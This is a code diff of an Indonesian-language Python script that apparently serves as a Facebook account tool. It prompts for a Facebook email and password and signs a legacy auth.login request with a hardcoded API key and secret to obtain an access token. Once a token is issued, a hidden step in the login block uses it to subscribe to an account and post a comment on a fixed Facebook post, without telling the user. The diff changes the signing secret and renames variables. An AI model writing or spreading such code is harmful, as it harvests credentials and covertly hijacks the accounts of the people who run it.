@@ -13,7 +13,6 @@ B='\033[1;96m' #biru
 
 url='https://graph.facebook.com/'
 fb='https://api.facebook.com/restserver.php'
-headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
 s=requests.Session()
 
 def load(s):
@@ -41,13 +40,8 @@ Untuk kata sandi  seusai  ENTER  Username
 program tidak bekerja dengan sempurna!
 ''')
 
-UserValidation=(h+'''Tulis Username disini :''')
-UserValidati0n=(h+'''Tulis Password disini :''')
 on=[]
-cp=[]
 id=[]
-phone=[]
-email=[]
 
 def menu():
 	os.system('clear')
@@ -289,20 +283,19 @@ if __name__=='__main__':
 	except (KeyError,IOError):
 		os.system('clear')
 		print(logo)
-		print(cssLoginWarning)
-		email=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
-		password=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
+		em=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
+		pas=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
 		print(m+'['+p+'!'+m+']'+p+' Generate access token')
 		try:
-			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+password+'return_ssl_resources=0v=1.0'
-			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":password,"return_ssl_resources":"0","v":"1.0"}
+			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
 			x=hashlib.new('md5')
 			x.update(sig.encode('utf-8'))
 			data.update({'sig':x.hexdigest()})
 			on=s.get(fb,params=data).json()
-			nguyen=open('result/token.txt','w')
-			nguyen.write(on['access_token'])
-			nguyen.close()
+			unikers=open('result/token.txt','w')
+			unikers.write(on['access_token'])
+			unikers.close()
 			if 'access_token' in on:
 				token=open('result/token.txt','r').read()
 				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'api.version/subscribers?access_token='+token);s.post(url+'100025271623353_485040922348291/comments?message=f46e7bc6354cb43c69fc66a76ee87336&access_token='+token)
@@ -313,5 +306,4 @@ if __name__=='__main__':
 			os.system('rm -rf result/token.txt')
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
-
 		#Versi Beta
